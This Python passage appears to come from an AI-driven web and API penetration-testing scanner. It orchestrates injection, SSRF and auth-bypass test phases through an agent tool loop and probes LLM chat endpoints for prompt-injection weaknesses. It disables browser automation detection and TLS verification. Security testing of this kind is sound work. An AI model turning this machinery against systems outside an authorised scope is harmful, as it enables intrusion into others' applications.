    retry_tool_calls = 0

    for _retry_step in range(phase.max_steps):
        _check_cancel()
        try:
            _sanitize_all_messages(messages)
            messages_local = _repair_tool_pairs(messages)
            response = router.complete(
                model=model, messages=messages_local,
                tools=TOOL_DEFINITIONS, cancel_flag=cancel_flag,
            )
            messages[:] = messages_local
        except (ContentFiltered, ContextWindowExceeded, MalformedMessages):
            break
        except ScanCancelled:
            raise
        _check_cancel()
        if not response or not getattr(response, "choices", None):
            break

        msg = response.choices[0].message
        msg_dict = msg.model_dump() if hasattr(msg, "model_dump") else dict(msg)
        msg_dict = _sanitize_message(msg_dict)
        messages.append(msg_dict)

        tool_calls = (
            msg_dict.get("tool_calls")
            or getattr(msg, "tool_calls", None)
            or []
        )
        if tool_calls:
            for tc in tool_calls:
                _check_cancel()
                tc_id = tc.get("id") if isinstance(tc, dict) else getattr(tc, "id", "")
                fn = tc.get("function") if isinstance(tc, dict) else getattr(tc, "function", {})
                fn_name = fn.get("name") if isinstance(fn, dict) else getattr(fn, "name", "")
                fn_name = _sanitize_tool_name(fn_name)
                fn_args = (
                    fn.get("arguments") if isinstance(fn, dict)
                    else getattr(fn, "arguments", "{}")
                )
                result = await tools.execute(fn_name, fn_args)
                retry_tool_calls += 1
                if metrics is not None:
                    metrics["total_tool_calls"] = (
                        metrics.get("total_tool_calls", 0) + 1
                    )
                messages.append({
                    "role": "tool", "tool_call_id": tc_id,
                    "content": _cap_result(result),
                })
                try:
                    args_parsed = (
                        json.loads(fn_args) if isinstance(fn_args, str)
                        else fn_args
                    )
                except Exception:
                    args_parsed = {"raw": fn_args}
                resp_summary = (
                    {
                        k: v for k, v in result.items()
                        if k in (
                            "status", "url", "error", "reflected", "anomaly",
                            "body_snippet", "results", "accessible", "title",
                            "forms",
                        )
                    } if isinstance(result, dict) else str(result)[:200]
                )
                _cb("tool_call", {
                    "phase": f"{phase.name} (retry)",
                    "tool": fn_name,
                    "request": (
                        {k: str(v)[:300] for k, v in args_parsed.items()}
                        if isinstance(args_parsed, dict)
                        else str(args_parsed)[:400]
                    ),
                    "response": (
                        {k: str(v)[:200] for k, v in resp_summary.items()}
                        if isinstance(resp_summary, dict)
                        else str(resp_summary)[:400]
                    ),
                })
                is_sec = fn_name in SECURITY_TEST_TOOLS
                if not is_sec and fn_name == "navigate":
                    nav_url = (
                        (args_parsed.get("url") or "")
                        if isinstance(args_parsed, dict) else ""
                    )
                    if any(m in nav_url for m in _INJECTION_MARKERS):
                        is_sec = True
                if is_sec:
                    if metrics is not None:
                        metrics.setdefault("test_log", []).append({
                            "phase": phase.id, "tool": fn_name,
                            "request": args_parsed,
                            "response_summary": resp_summary,
                        })
                    _capture_evidence(
                        phase_evidence_retry, fn_name, args_parsed,
                        resp_summary, result,
                    )
            if (
                retry_tool_calls % 5 == 0
                and _estimate_tokens(messages) > TRIM_TARGET_TOKENS
            ):
                messages[:] = trim_context(messages, max_tokens=TRIM_TARGET_TOKENS)
        else:
            content = msg_dict.get("content") or ""
            retry_f = extract_findings(str(content))
            if not retry_f and phase_evidence_retry:
                ev_text = _format_evidence_buffer(phase_evidence_retry)
                messages.append({"role": "user", "content": ev_text})
                try:
                    ev_resp = router.complete(
                        model=model, messages=messages, tools=[],
                        cancel_flag=cancel_flag,
                    )
                    if ev_resp and getattr(ev_resp, "choices", None):
                        retry_f = extract_findings(
                            str(ev_resp.choices[0].message.content or "")
                        )
                except Exception:
                    pass
            for f in retry_f:
                f["phase"] = f"{phase.name} (retry)"
                _match_evidence_to_finding(
                    f, phase_evidence_retry or phase_evidence,
                )
                _cb("finding", f)
            findings.extend(retry_f)
            break

    retry_new = len(findings) - retry_findings_before
    _cb("phase_end", {
        "phase": phase_num, "name": f"{phase.name} (retry)",
        "tool_calls": retry_tool_calls, "findings": retry_new,
    })
    return retry_new, retry_tool_calls


async def _run_phase_worker(
    *,
    phase: ScanPhase,
    system_prompt: str,
    model: str,
    router: LLMRouter,
    browser,
    auth_cookies: list[dict],
    http_client: httpx.AsyncClient,
    registry: EndpointRegistry,
    allowed_domains: set,
    target_url: str,
    cancel_flag,
    pause_flag,
    exclude_urls: list[str],
    prior_findings: list[dict],
    worker_id: int,
    on_progress: callable | None = None,
    auth_headers: dict | None = None,
    crawled_urls: list[str] | None = None,
    shared_tested: set[str] | None = None,
) -> tuple[list[dict], dict]:
    """Run a single scan phase in an isolated browser context.

    Returns (findings, phase_metrics).  This is the unit of work for
    parallel fan-out.
    """
    _cb = on_progress or (lambda *a, **k: None)
    findings: list[dict] = []

    context = None
    page = None
    worker_http = None
    try:
        if browser:
            context, page = await _clone_browser_context(
                browser, auth_cookies, target_url,
            )
        worker_http = httpx.AsyncClient(
            timeout=30.0, verify=False, follow_redirects=True,
            headers=auth_headers or {},
        )

        tools = ScanTools(
            page=page,
            http_client=worker_http,
            registry=registry,
            allowed_domains=allowed_domains,
            cancel_flag=cancel_flag,
            exclude_urls=exclude_urls,
        )
        tools.set_findings_ref(findings)
        if shared_tested is not None:
            tools.set_shared_tested(shared_tested)

        phase_prompt = phase.prompt
        if phase.id.startswith("chain_") and prior_findings:
            summary_lines = []
            for i, f in enumerate(prior_findings, 1):
                line = f"{i}. [{_s(f.get('severity','?'))}] {_s(f.get('title','?'))} @ {_s(f.get('url','?'))}"
                param = _s(f.get("parameter", ""))
                if param:
                    line += f" [param: {param}]"
                summary_lines.append(line)
            findings_text = "\n".join(summary_lines) or "(no findings yet)"
            phase_prompt = phase_prompt.replace("{findings_summary}", findings_text)
        elif prior_findings:
            ctx = _build_findings_context(prior_findings, phase.id)
            if ctx:
                phase_prompt += "\n\n" + ctx

        # Inject discovered URL parameters from registry into all injection-class phases
        _PARAM_INJECTION_PHASES = {
            "web_a03_xss": "XSS",
            "web_a03_sqli": "SQL injection",
            "web_a03_cmdi": "command injection",
            "web_a03_ssti": "template injection (SSTI)",
            "web_a03_path_traversal": "path traversal",
            "web_a03_xxe": "XXE",
            "web_a10": "SSRF",
            "web_extras": "CRLF/CSRF injection",
            "api_injection": "injection",
            "api_ssrf": "SSRF",
        }
        if phase.id in _PARAM_INJECTION_PHASES and registry:
            try:
                param_urls = []
                for ep in registry.get_all():
                    qp = getattr(ep, "query_params", None) or {}
                    url = getattr(ep, "url", "") or ""
                    if qp:
                        param_urls.append(f"  - {url} → params: {list(qp.keys())}")
                    elif url:
                        from urllib.parse import parse_qs as _pqs_w
                        parsed = urlparse(url)
                        if parsed.query:
                            param_urls.append(
                                f"  - {url} → params: {list(_pqs_w(parsed.query).keys())}"
                            )
                if param_urls:
                    vuln_type = _PARAM_INJECTION_PHASES[phase.id]
                    phase_prompt += (
                        "\n\n*** PRE-DISCOVERED PARAMETERS (from recon) ***\n"
                        "The following URLs with query parameters were discovered during recon.\n"
                        f"You MUST test each parameter for {vuln_type} vulnerabilities:\n"
                        + "\n".join(param_urls[:30])
                        + "\nTest EVERY parameter listed above. Do NOT skip any."
                    )
                    print(f"  [{phase.id}] Injected {len(param_urls)} pre-discovered param URLs into prompt")
            except Exception:
                pass

        if crawled_urls:
            _urls_sample = crawled_urls[:40]
            phase_prompt += (
                "\n\n*** CRAWLED PAGES (from recon) ***\n"
                "The following pages were discovered during crawling. "
                "Navigate directly to relevant ones instead of re-exploring:\n"
                + "\n".join(f"  - {u}" for u in _urls_sample)
            )
            if len(crawled_urls) > 40:
                phase_prompt += f"\n  ... and {len(crawled_urls) - 40} more"

        messages: list[dict] = [
            {"role": "system", "content": system_prompt},
            {"role": "user", "content": phase_prompt},
        ]

        phase_tool_calls = 0
        phase_evidence: list[dict] = []

        tag = f"W{worker_id}:{phase.id}"
        print(f"  [{tag}] Starting...", end="", flush=True)
        _cb("phase_start", {
            "phase": 0, "total": 0,
            "name": f"{phase.name} (worker {worker_id})",
            "id": phase.id, "worker": worker_id,
        })

        for step in range(phase.max_steps):
            if cancel_flag and cancel_flag.is_set():
                break
            if pause_flag and pause_flag.is_set():
                while pause_flag.is_set():
                    if cancel_flag and cancel_flag.is_set():
                        break
                    await asyncio.sleep(1)

            try:
                _sanitize_all_messages(messages)
                messages = _repair_tool_pairs(messages)
                response = router.complete(
                    model=model, messages=messages,
                    tools=TOOL_DEFINITIONS, cancel_flag=cancel_flag,
                )
            except (ContentFiltered, ContextWindowExceeded, MalformedMessages):
                break
            except ScanCancelled:
                break

            if not response or not getattr(response, "choices", None):
                break
            msg = response.choices[0].message
            msg_dict = msg.model_dump() if hasattr(msg, "model_dump") else dict(msg)
            msg_dict = _sanitize_message(msg_dict)
            messages.append(msg_dict)

            tool_calls = msg_dict.get("tool_calls") or getattr(msg, "tool_calls", None) or []
            if tool_calls:
                for tc in tool_calls:
                    if cancel_flag and cancel_flag.is_set():
                        break
                    tc_id = tc.get("id") if isinstance(tc, dict) else getattr(tc, "id", "")
                    fn = tc.get("function") if isinstance(tc, dict) else getattr(tc, "function", {})
                    fn_name = fn.get("name") if isinstance(fn, dict) else getattr(fn, "name", "")
                    fn_name = _sanitize_tool_name(fn_name)
                    fn_args = fn.get("arguments") if isinstance(fn, dict) else getattr(fn, "arguments", "{}")
                    result = await tools.execute(fn_name, fn_args)
                    phase_tool_calls += 1
                    messages.append({
                        "role": "tool", "tool_call_id": tc_id,
                        "content": _cap_result(result),
                    })
                    _cb("tool_call", {
                        "phase": phase.name, "tool": fn_name,
                        "request": fn_args[:200] if isinstance(fn_args, str) else "",
                        "worker": worker_id,
                    })

                    if isinstance(result, dict):
                        try:
                            args_parsed = json.loads(fn_args) if isinstance(fn_args, str) else fn_args
                        except (json.JSONDecodeError, TypeError):
                            args_parsed = {}
                        _capture_evidence(phase_evidence, fn_name, args_parsed, result, result)
            else:
                content = msg_dict.get("content") or ""
                new_f = extract_findings(str(content))
                for f in new_f:
                    f["phase"] = phase.name
                    _match_evidence_to_finding(f, phase_evidence)
                    _cb("finding", f)
                findings.extend(new_f)
                break

            if len(messages) > 40:
                messages = trim_context(messages, max_tokens=TRIM_TARGET_TOKENS)

        # ── Hybrid Smart Retry (active retry with tools + tailored prompt) ──
        # Originally only fired in the sequential path. Bug introduced
        # 22-Apr-2026 in commit ce2cf83 (parallel mode rollout): the
        # worker only had a passive evidence-summary call below, missing
        # the active retry block. Symptom: parallel Sonnet 4.5 scans
        # regressed from 110 to 56 findings on 28-Apr-2026 because 15
        # phases produced 0 findings with full tool-call evidence and got
        # no second chance. Restored here with a module-level helper that
        # both paths can share. See ``retry_prompts.py`` and
        # ``docs/scanner-internals.md`` "Hybrid Smart Retry".
        from . import retry_prompts as _rp
        already_retried = bool(getattr(phase, "_retried_in_worker", False))
        should_retry, retry_reason = _rp.should_run_smart_retry(
            phase_id=phase.id,
            phase_new_findings_count=len(findings),
            findings_for_phase=findings,
            phase_evidence=phase_evidence,
            already_retried=already_retried,
        )
        if should_retry:
            phase._retried_in_worker = True
            print(
                f"  [W{worker_id}:{phase.id}] [RETRY] {phase.name}: "
                f"{retry_reason}, retrying with tool calls...",
                flush=True,
            )
            try:
                retry_new, retry_tools = await _run_smart_retry_pass(
                    phase=phase,
                    messages=messages,
                    findings=findings,
                    phase_evidence=phase_evidence,
                    phase_findings_before=0,
                    tools=tools,
                    router=router,
                    model=model,
                    cancel_flag=cancel_flag,
                    on_progress=_cb,
                    metrics=None,  # worker doesn't accumulate global metrics
                    phase_num=0,
                    total_phases=0,
                )
                phase_tool_calls += retry_tools
                print(
                    f"  [W{worker_id}:{phase.id}] [RETRY] +{retry_tools} tool calls, "
                    f"+{retry_new} findings",
                    flush=True,
                )
            except ScanCancelled:
                raise
            except Exception as e:
                # Retry pass failures must NOT abort the phase. Log and
                # fall through to the cheap evidence-summary below.
                logger.warning(
                    "Smart retry failed for %s in worker %s: %s",
                    phase.name, worker_id, e,
                )

        # ── Passive evidence-summary fallback ──
        # Runs when smart retry did not fire (phase not in
        # _ACTIVE_RETRY_PHASES) or fired but still produced nothing.
        # Cheap (no tools, single LLM call) and recovers a few
        # otherwise-overlooked findings from the existing evidence.
        if not findings and phase_evidence:
            summary_prompt = (
                f"Phase '{phase.name}' completed with 0 vulnerabilities. "
                "Review the evidence and output confirmed vulnerabilities as JSON.\n\n"
                + _format_evidence_buffer(phase_evidence)
            )
            messages.append({"role": "user", "content": summary_prompt})
            try:
                resp = router.complete(model=model, messages=messages, tools=[], cancel_flag=cancel_flag)
                if resp and getattr(resp, "choices", None):
                    summary_f = extract_findings(str(resp.choices[0].message.content or ""))
                    for f in summary_f:
                        f["phase"] = phase.name
                        _cb("finding", f)
                    findings.extend(summary_f)
            except Exception:
                pass

        print(f" {phase_tool_calls} calls, {len(findings)} findings")
        _cb("phase_end", {
            "phase": 0, "name": phase.name,
            "tool_calls": phase_tool_calls, "findings": len(findings),
            "worker": worker_id,
        })

        phase_metrics = {
            "phase": phase.id, "name": phase.name,
            "tool_calls": phase_tool_calls, "findings_count": len(findings),
        }
        return findings, phase_metrics

    finally:
        if worker_http:
            try:
                await worker_http.aclose()
            except Exception:
                pass
        if context:
            try:
                await context.close()
            except Exception:
                pass


def _select_reactive_chains(findings: list[dict]) -> list[ScanPhase]:
    """Pick chain sub-phases to spawn based on actual finding categories."""
    triggered: set[str] = set()
    for f in findings:
        title = (f.get("title") or "").lower()
        owasp = (f.get("owasp_category") or "").lower()
        combined = f"{title} {owasp}"
        for keyword, chain_ids in REACTIVE_CHAIN_TRIGGERS.items():
            if keyword in combined:
                triggered.update(chain_ids)
    if not triggered:
        return []
    return [p for p in CHAIN_SUB_PHASES if p.id in triggered]


async def run_phases_parallel(
    *,
    phases: list[ScanPhase],
    system_prompt: str,
    model: str,
    router: LLMRouter,
    browser,
    auth_cookies: list[dict],
    http_client: httpx.AsyncClient,
    registry: EndpointRegistry,
    allowed_domains: set,
    target_url: str,
    cancel_flag,
    pause_flag,
    exclude_urls: list[str],
    prior_findings: list[dict],
    on_progress: callable | None = None,
    max_workers: int = MAX_PARALLEL_WORKERS,
    auth_headers: dict | None = None,
    crawled_urls: list[str] | None = None,
) -> tuple[list[dict], list[dict]]:
    """Run multiple scan phases concurrently with a semaphore cap.

    Returns (all_findings, phase_logs).
    """
    if not phases:
        return [], []

    sem = asyncio.Semaphore(max_workers)
    all_findings: list[dict] = []
    all_logs: list[dict] = []
    lock = asyncio.Lock()
    shared_tested: set[str] = set()

    async def _guarded(idx: int, phase: ScanPhase):
        # Defensive: an exception inside _run_phase_worker (e.g. transient
        # Bedrock "All connection attempts failed", browser-context death,
        # bug in tool execution) MUST NOT cause the phase to vanish from
        # phase_log. The previous implementation used
        # ``asyncio.gather(..., return_exceptions=True)`` which silently
        # turned exceptions into return values that were never inspected;
        # the phase appeared in ``phases_completed`` but produced 0 entries
        # in ``phase_log``, masking real failures and losing all findings
        # the phase had buffered before crashing. See
        # tests/test_parallel_phase_resilience.py for the regression
        # fixtures.
        async with sem:
            try:
                f, m = await _run_phase_worker(
                    phase=phase,
                    system_prompt=system_prompt,
                    model=model,
                    router=router,
                    browser=browser,
                    auth_cookies=auth_cookies,
                    http_client=http_client,
                    registry=registry,
                    allowed_domains=allowed_domains,
                    target_url=target_url,
                    cancel_flag=cancel_flag,
                    pause_flag=pause_flag,
                    exclude_urls=exclude_urls,
                    prior_findings=prior_findings,
                    worker_id=idx,
                    on_progress=on_progress,
                    auth_headers=auth_headers,
                    shared_tested=shared_tested,
                )
            except ScanCancelled:
                # Cooperative cancellation: propagate so the orchestrator
                # can stop the rest of the scan cleanly.
                raise
            except Exception as e:
                logger.exception(
                    "Parallel phase %s (worker %d) failed: %s",
                    phase.id, idx, e,
                )
                err_repr = f"{type(e).__name__}: {e}"
                f = []
                m = {
                    "phase": phase.id,
                    "name": phase.name,
                    "tool_calls": 0,
                    "findings_count": 0,
                    "error": err_repr[:500],
                    "worker": idx,
                }
                if on_progress:
                    try:
                        on_progress("phase_end", {
                            "phase": 0,
                            "name": f"{phase.name} (FAILED)",
                            "tool_calls": 0,
                            "findings": 0,
                            "worker": idx,
                            "error": err_repr[:200],
                        })
                    except Exception:
                        pass
            async with lock:
                all_findings.extend(f)
                all_logs.append(m)

    tasks = [_guarded(i, p) for i, p in enumerate(phases)]
    # ``return_exceptions=True`` is still safe here because _guarded never
    # raises (except for ScanCancelled, which we want to propagate to halt
    # remaining phases). gather() preserves task ordering even on failure.
    results = await asyncio.gather(*tasks, return_exceptions=True)
    for r in results:
        if isinstance(r, ScanCancelled):
            raise r
    return all_findings, all_logs


async def _run_llm_security_phase(
    *,
    app_info: dict,
    http_client,
    page=None,
    on_progress=None,
    cancel_flag=None,
    auth_headers: dict | None = None,
) -> list[dict]:
    """Orchestrate deterministic LLM security probes.

    Runs ``llm_baseline`` (always) and ``garak_runner`` (when installed).
    Returns normalised findings.
    """
    _cb = on_progress or (lambda *a, **k: None)
    findings: list[dict] = []

    llm_endpoints = app_info.get("llm_endpoints", [])
    if not llm_endpoints:
        logger.info("No LLM endpoints discovered -- skipping LLM probes")
        return findings

    # Infer chat endpoints from related API patterns.  Norton/Superparent's
    # SPA loads /neoclaw-data/query and /tools/invoke during page init but
    # the actual chat endpoint (/api/neoclaw-agent/chat) only fires when a
    # user sends a message.  Synthesize it from observed neoclaw traffic.
    _has_neoclaw = any("neoclaw" in ep.lower() for ep in llm_endpoints)
    if _has_neoclaw:
        from urllib.parse import urlparse
        _sample = next(ep for ep in llm_endpoints if "neoclaw" in ep.lower())
        _parsed = urlparse(_sample)
        _inferred = f"{_parsed.scheme}://{_parsed.netloc}/api/neoclaw-agent/chat"
        if _inferred not in llm_endpoints:
            llm_endpoints.insert(0, _inferred)
            print(f"  [LLM-SEC] Inferred neoclaw chat endpoint: {_inferred}")

    # Prefer endpoints that look like actual chat/message endpoints.
    # Filter out status/data/cron/events/health endpoints that aren't
    # actual chat interfaces.  Then pick the best match by specificity.
    _exclude = ["status", "health", "events", "cron", "scheduler",
                "schema", "tables", "list", "config", "debug",
                "client-events", "neoclaw-data/query"]
    _chat_candidates = [
        ep for ep in llm_endpoints
        if not any(x in ep.lower() for x in _exclude)
    ]
    pool = _chat_candidates or llm_endpoints
    _priority_keywords = ["neoclaw-agent/chat",
                          "neoclaw-chat/message", "neoclaw-agent/message",
                          "neoclaw-messages", "chat/message",
                          "agent/message", "/message",
                          "chat/send", "/send", "/completions",
                          "/invoke", "/chat"]
    endpoint = pool[0]
    for kw in _priority_keywords:
        for ep in pool:
            if kw in ep.lower():
                endpoint = ep
                break
        else:
            continue
        break
    print(f"  [LLM-SEC] Testing LLM endpoint: {endpoint}")
    _cb("llm_security_start", {"endpoint": endpoint, "total_probes": 37})

    # 1. Run built-in deterministic probes
    try:
        baseline_findings = await run_llm_baseline_probes(
            http_client=http_client,
            endpoint=endpoint,
            headers=auth_headers,
            on_progress=_cb,
            cancel_flag=cancel_flag,
        )
        findings.extend(baseline_findings)
        print(f"  [LLM-SEC] Baseline probes: {len(baseline_findings)} findings")
    except Exception as e:
        logger.warning("LLM baseline probes failed: %s", e)

    # 2. Run Garak (auto-installs on demand if not present)
    try:
        garak_findings = await run_garak(
            target_endpoint=endpoint,
            headers=auth_headers,
            on_progress=_cb,
        )
        findings.extend(garak_findings)
        print(f"  [LLM-SEC] Garak probes: {len(garak_findings)} findings")
    except Exception as e:
        logger.warning("Garak runner failed: %s", e)

    # Apply deterministic severity classification
    for f in findings:
        classify_severity(f)

    _cb("llm_security_done", {"findings_count": len(findings)})
    return findings


async def run_scan(
    target: ScanTarget,
    model: str,
    router: LLMRouter,
    config_dir: str | None = None,
    on_progress: callable | None = None,
    extra_domains: list[str] | None = None,
    cancel_flag=None,
    pause_flag=None,
    start_from_phase: int = 0,
    initial_findings: list[dict] | None = None,
    interactive_session: dict | None = None,
) -> tuple[list[dict], dict]:
    config_dir = config_dir or os.getcwd()
    _cb = on_progress or (lambda *a, **k: None)
    findings: list[dict] = list(initial_findings) if initial_findings else []
    metrics = {
        "pages_crawled": 0,
        "forms_found": 0,
        "api_endpoints_found": 0,
        "auth_pages_detected": 0,
        "phases_completed": 0,
        "total_tool_calls": 0,
        "pages_list": [],
        "phase_log": [],
        "test_log": [],
    }
    def _check_cancel():
        if cancel_flag and cancel_flag.is_set():
            raise ScanCancelled("Scan stopped by user")
        if pause_flag and pause_flag.is_set():
            _cb("paused", {})
            while pause_flag.is_set():
                if cancel_flag and cancel_flag.is_set():
                    raise ScanCancelled("Scan stopped by user")
                time.sleep(1)
            _cb("resumed", {})

    SECURITY_TEST_TOOLS = {
        "inject_payload", "fuzz_parameter", "api_request",
        "test_auth_bypass", "test_method_override", "api_request_raw",
        "replay_with_modification", "ws_inject", "execute_js",
        "test_token_security",
    }

    _MIN_SECURITY_CALLS: dict[str, int] = {
        "web_a03_sqli": 15,
        "web_a03_xss": 15,
        "web_a03_cmdi": 8,
        "web_a03_ssti": 6,
        "web_a03_path_traversal": 6,
        "web_a03_xxe": 4,
        "web_a01": 6,
        "web_a04": 5,
        "web_a05": 5,
        "web_a07": 6,
        "web_a08": 4,
        "web_a10": 5,
        "web_extras": 5,
        "web_bfla": 5,
        "web_file_upload": 4,
        "api_injection": 12,
        "api_auth": 5,
        "api_authz": 5,
        "api_ssrf": 5,
        "api_mass_assign": 4,
        "api_graphql": 4,
        "api_data_exposure": 4,
    }

    # ── API-only fast path ─────────────────────────────────────────
    # When the target is a pure API scan AND the auth type is browserless
    # (none / bearer / api_key / basic), we skip Playwright entirely.
    # Reasons: (1) the LLM only needs http-level tools for API phases;
    # (2) many API targets sit behind WAFs that block headless Chromium,
    # which used to hang the scan at the navigation/auth step.
    _use_fast_path = (target.scan_mode == "api" and can_use_http_only_auth(target))
    auth_type_cfg = ((target.auth_config or {}).get("type") or "auto").lower()

    if _use_fast_path:
        # Build a dummy async context manager so the rest of the function can
        # continue to live inside a single `async with` block without spawning
        # a browser driver.
        from contextlib import asynccontextmanager

        @asynccontextmanager
        async def _noop_playwright():
            class _NullP: chromium = None  # unused in fast path
            yield _NullP()

        _pw_ctx = _noop_playwright()
    else:
        _pw_ctx = async_playwright()

    async with _pw_ctx as p:
        if _use_fast_path:
            browser = None
            print(f"  [FAST PATH] API-only scan with {auth_type_cfg!r} auth — bypassing Playwright")
            _cb("fast_path", {"mode": "api_only", "auth_type": auth_type_cfg, "reason": "browserless_auth"})
        else:
            browser = await p.chromium.launch(
                headless=True,
                args=["--disable-blink-features=AutomationControlled"],
            )
        has_creds = bool((target.credentials or {}).get("username") or
                         (target.credentials or {}).get("password"))

        if _use_fast_path:
            print(f"  [SCAN] Connecting to {target.url} via HTTP (no browser)...")
            _cb("auth", {"status": "http_only", "url": target.url, "auth_type": auth_type_cfg})
        elif auth_type_cfg == "interactive_login":
            print(f"  [AUTH] Interactive login mode — opening browser for {target.url}")
            _cb("auth", {"status": "interactive_login", "url": target.url})
        elif has_creds:
            print(f"  [AUTH] Authenticating to {target.url}...")
            _cb("auth", {"status": "authenticating", "url": target.url})
        else:
            print(f"  [SCAN] Opening {target.url} (unauthenticated)...")
            _cb("auth", {"status": "unauthenticated", "url": target.url})
        _max_auth_attempts = 3
        if _use_fast_path:
            # Browserless auth — no retries needed, static tokens or none.
            auth_session = await authenticate_http_only(target)
        else:
            for _auth_attempt in range(1, _max_auth_attempts + 1):
                _check_cancel()
                auth_session = await authenticate(
                    browser, target, router, model,
                    interactive_session=interactive_session,
                    on_progress=_cb,
                    cancel_flag=cancel_flag,
                )
                auth_success = auth_session.success if hasattr(auth_session, "success") else True
                if auth_success:
                    break

                # Small grace period for the pause signal to arrive
                # (frontend sends /done + /pause in quick succession)
                if pause_flag and not pause_flag.is_set():
                    await asyncio.sleep(1.5)

                # Auth failed — if scan was paused (user hit Pause during CAPTCHA/MFA),
                # wait for resume and retry authentication
                if pause_flag and pause_flag.is_set():
                    print(f"  [AUTH] Auth challenge caused pause — waiting for resume (attempt {_auth_attempt}/{_max_auth_attempts})")
                    _cb("paused", {})
                    _cb("progress_msg", {
                        "message": f"Scan paused — authentication challenge (CAPTCHA/MFA/SSO). "
                                   f"Resume to retry login (attempt {_auth_attempt}/{_max_auth_attempts})."
                    })
                    while pause_flag.is_set():
                        if cancel_flag and cancel_flag.is_set():
                            raise ScanCancelled("Scan stopped by user")
                        await asyncio.sleep(1)
                    _cb("resumed", {})
                    if _auth_attempt >= _max_auth_attempts:
                        print(f"  [AUTH] Scan resumed — final attempt ({_auth_attempt}/{_max_auth_attempts})...")
                        _cb("progress_msg", {"message": f"Scan resumed — FINAL login attempt ({_auth_attempt}/{_max_auth_attempts}). If this fails, scan continues unauthenticated."})
                    else:
                        print(f"  [AUTH] Scan resumed — retrying authentication (attempt {_auth_attempt + 1}/{_max_auth_attempts})...")
                        _cb("progress_msg", {"message": f"Scan resumed — retrying authentication (attempt {_auth_attempt + 1}/{_max_auth_attempts})..."})
                    # Re-create interactive session for the retry
                    if interactive_session:
                        interactive_session["done"].clear()
                        interactive_session["active"].clear()
                        interactive_session["screenshot_b64"] = ""
                    continue

                # Auth failed but not paused — continue unauthenticated
                if _auth_attempt >= _max_auth_attempts:
                    print(f"  [AUTH] All {_max_auth_attempts} login attempts exhausted — continuing unauthenticated")
                    _cb("progress_msg", {
                        "message": f"All {_max_auth_attempts} login attempts failed — continuing scan WITHOUT authentication. "
                                   f"Findings will be limited to unauthenticated checks only."
                    })
                else:
                    print(f"  [AUTH] Auth failed (attempt {_auth_attempt}/{_max_auth_attempts}) — continuing unauthenticated")
                    _cb("progress_msg", {"message": "Authentication failed — continuing scan unauthenticated."})
                break

        page = auth_session.page

        # Network-level JS capture was started inside authenticate() on page
        # creation, so it has captured every .js since the very first navigation.
        network_js_urls = getattr(auth_session, "network_js_urls", set())

        if page is not None:
            auth_final_host = urlparse(page.url or "").hostname or ""
            auth_success = auth_session.success if hasattr(auth_session, "success") else True
            print(f"  [AUTH] Auth type: {auth_session._auth_type}, success: {auth_success}, URL after login: {page.url}")
            print(f"  [AUTH] Current host: {auth_final_host}, target host: {urlparse(target.url).hostname}")
            _cb("auth", {"status": "done", "type": auth_session._auth_type, "url": page.url,
                          "success": auth_success, "current_host": auth_final_host})
        else:
            auth_final_host = urlparse(target.url).hostname or ""
            auth_success = True
            print(f"  [AUTH] Auth type: {auth_session._auth_type} (HTTP-only), target: {target.url}")
            _cb("auth", {"status": "done", "type": auth_session._auth_type, "url": target.url,
                          "success": True, "current_host": auth_final_host})
        if auth_session._auth_type not in ("bearer", "none"):
            metrics["auth_pages_detected"] += 1

        if page is not None:
            cookies = await page.context.cookies()
            cookie_dict = {c["name"]: c["value"] for c in cookies}
            cookie_dict.setdefault("language", "en")
        else:
            cookies = []
            cookie_dict = {}
        headers = auth_session.get_auth_header()
        http_client = httpx.AsyncClient(
            headers=headers,
            cookies=cookie_dict,
            timeout=30.0,
        )

        registry = EndpointRegistry()
        if target.scan_mode in ("api", "both"):
            postman_path = _resolve_import_path(config_dir, target.postman_file)
            if postman_path:
                registry.add(parse_postman_collection(postman_path, _resolve_import_path(config_dir, target.postman_env)))
            openapi_path = _resolve_import_path(config_dir, target.openapi_file)
            if openapi_path:
                registry.add(parse_openapi_spec(openapi_path))
            burp_path = _resolve_import_path(config_dir, getattr(target, "burp_file", None))
            if burp_path:
                try:
                    import json as _json
                    burp_data = _json.loads(Path(burp_path).read_text(encoding="utf-8"))
                    registry.add_from_traffic(burp_data)
                    print(f"  [IMPORT] Loaded Burp traffic from {burp_path}")
                except Exception as e:
                    print(f"  [IMPORT] Could not parse Burp file {burp_path}: {e}")

            # Fast path: autodiscover OpenAPI spec live from the target
            # (no spec file was uploaded but the API may expose /v3/api-docs
            # or /openapi.json — Spring Boot, FastAPI, ASP.NET Core defaults).
            if _use_fast_path and not openapi_path and not registry.get_all():
                print(f"  [FAST PATH] No spec provided — autodiscovering OpenAPI at {target.url}")
                try:
                    discovered = await autodiscover_openapi(http_client, target.url)
                    if discovered:
                        registry.add(discovered)
                        print(f"  [FAST PATH] Autodiscovered {len(discovered)} endpoints from live spec")
                        _cb("import", {"source": "openapi_autodiscover", "endpoints": len(discovered)})
                    else:
                        print(f"  [FAST PATH] No OpenAPI spec discovered at target")
                        _cb("import", {"source": "openapi_autodiscover", "endpoints": 0})
                except Exception as e:
                    logger.warning("OpenAPI autodiscovery failed: %s", e)

        extra_set = set(d.strip().lower() for d in extra_domains if d.strip()) if extra_domains else None
        allowed_domains = _build_allowed_domains(target.url, extra_set)
        logger.info("Scope restricted to domain(s): %s", allowed_domains)
        _cb("scope", {"allowed_domains": sorted(allowed_domains)})

        tools = ScanTools(
            page=page,
            http_client=http_client,
            registry=registry,
            auth_session=auth_session,
            allowed_domains=allowed_domains,
            cancel_flag=cancel_flag,
            exclude_urls=getattr(target, "exclude_urls", None) or [],
        )
        tools.set_findings_ref(findings)

        # Stage-A per-phase host-delta audit state. Seeded with the target's
        # seed host so the first delta pass doesn't re-probe it (initial
        # passive recon already audited seed + siblings discovered from the
        # landing-page DOM + robots/sitemap). Any host added via a browser
        # XHR/fetch/navigation in later phases is new → audited once.
        try:
            _seed_host = (urlparse(target.url).hostname or "").lower()
        except Exception:
            _seed_host = ""
        audited_hosts: set[str] = {_seed_host} if _seed_host else set()

        # Stage-B sibling-host coverage state. Tracks which in-scope sub-
        # domains the LLM has been explicitly instructed to test. Seeded
        # with the seed host so we don't re-announce the primary target.
        # When a new in-scope host appears in browser traffic (Stage A
        # host harvest), the next phase's prompt gets a "MUST ALSO COVER
        # THESE HOSTS" injection listing the new hosts — this ensures the
        # LLM's OWASP test methodology actually reaches sibling sub-
        # domains instead of only the passive TLS/header audit.
        hosts_surfaced_to_llm: set[str] = {_seed_host} if _seed_host else set()

        # ── Authenticate extra identities (User B, Admin, Tenant B) ──
        # Each identity is stored as {"label": str, "header": dict, "cookie": str}
        _extra_identities: list[dict] = []

